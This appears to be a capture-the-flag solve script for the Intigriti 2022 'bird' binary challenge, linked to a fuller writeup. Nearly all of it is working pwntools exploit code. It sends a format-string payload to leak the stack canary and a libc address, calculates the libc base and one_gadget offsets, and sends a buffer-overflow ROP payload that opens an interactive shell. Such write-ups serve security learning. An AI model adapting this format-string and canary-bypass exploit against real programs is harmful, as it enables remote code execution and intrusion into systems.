[FULL WRITEUP](https://book.cryptocat.me/ctf-writeups/2022/intigriti/pwn/bird)

#### solve.py

```py
#!/usr/bin/env python3
from pwn import *
import subprocess

exe = './bird'
libc = ELF('./libc.so.6', checksec=True)
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

gdbscript = '''
init-pwndbg
b *0x400b36
continue
'''.format(**locals())

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript above
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

p = start()

password = b"c56500c7ab26a5100d4672cf18835690"
leaks = b" %p" * 70

p.sendlineafter(b'bird:', password + leaks)
p.recvuntil(b'singing:')
leaked_addresses = p.readline().split()

debug = 0
if debug:
    i = 0
    for address in leaked_addresses:
        if len(address) > 16 and address.decode().endswith("00"):
            info(f"Canary candidate [{i}]: {address.decode()}")
        elif address.decode().startswith("0x7f"):
            info(f"Libc candidate [{i}]: {address.decode()}")

        i += 1

canary_leak = int(leaked_addresses[59], 16)
success("Canary @ " + str(hex(canary_leak)))
libc_leak = int(leaked_addresses[2], 16)
libc_base = libc_leak - 3705168 - libc.sym.printf
success("Libc   @ " + str(hex(libc_base)))

offset = 0x58

canary = p64(canary_leak)
pop_rdi = p64(0x400d53)

def one_gadget(filename):
  return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

gadgets = one_gadget('./libc.so.6')
log.info("OneGadget offsets: %s" % str(gadgets))
#=> [324565, 324658, 1090588]

gadget = p64(libc_base + gadgets[0])
payload = flat({offset: [canary, pop_rdi, gadget]})

p.sendlineafter(b'(y/n) ', payload)
p.interactive()
```
